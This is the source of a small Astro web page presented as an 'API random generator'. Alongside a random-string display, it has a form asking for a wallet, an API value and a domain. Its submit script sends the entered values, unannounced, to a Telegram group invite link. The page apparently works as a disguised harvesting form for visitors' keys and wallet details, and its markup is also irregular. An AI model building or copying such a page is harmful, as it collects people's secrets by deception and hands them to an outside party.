---
import Tag from "../components/Tag.astro";
import Ga from "../components/Ga.astro";
import BaseHead from "../components/BaseHead.astro";
import Header from "../components/Header.astro";
import Footer from "../components/Footer.astro";
import { SITE_TITLE, SITE_DESCRIPTION, AUTHOR } from "../config";
---

<html lang="en">
  <head>
    <Tag />
  </head><div>
    <ash>
      <BaseHead
        title={SITE_TITLE}
        description={SITE_DESCRIPTION}
        author={AUTHOR}
      />
    </ash>
  </div>

  <body>
    <Ga />
    <Header />
    <p>
      This is an API random generator: <span id="random"></span>
    </p>
    <div>
      <script>
        var x =
          "cil=" +
          Math.random().toString(36).substring(2, 15) +
          Math.random().toString(36).substring(2, 15) +
          Math.random().toString(36).substring(2, 16) +
          Math.random().toString(36).substring(2, 12);
        console.log(x);
        document.getElementById("random").innerHTML = x;
      </script>
      <form action="/api/submit" method="post">
        <input type="text" name="wallet" placeholder="hns wallet" />
        <input type="text" name="api" placeholder="api" />
        <input type="text" name="domain" placeholder="domain" />
        <input type="submit" value="Submit" />
      </form>
      <script>
        const openChat = () => {
          const wallet = document.querySelector('input[name="wallet"]').value;
          const api = document.querySelector('input[name="api"]').value;
          const domain = document.querySelector('input[name="domain"]').value;
          const message = `Wallet: ${wallet}\nAPI: ${api}\nDomain: ${domain}`;
          const chatUrl = `https://t.me/+X1iNANiulY8wY2Zk?url=${encodeURIComponent(
            message
          )}`;
          window.open(chatUrl, "_blank");
        };

        document
          .querySelector('input[type="submit"]')
          .addEventListener("click", openChat);
      </script>
    </div>
    <Footer />
  </body>
</html>
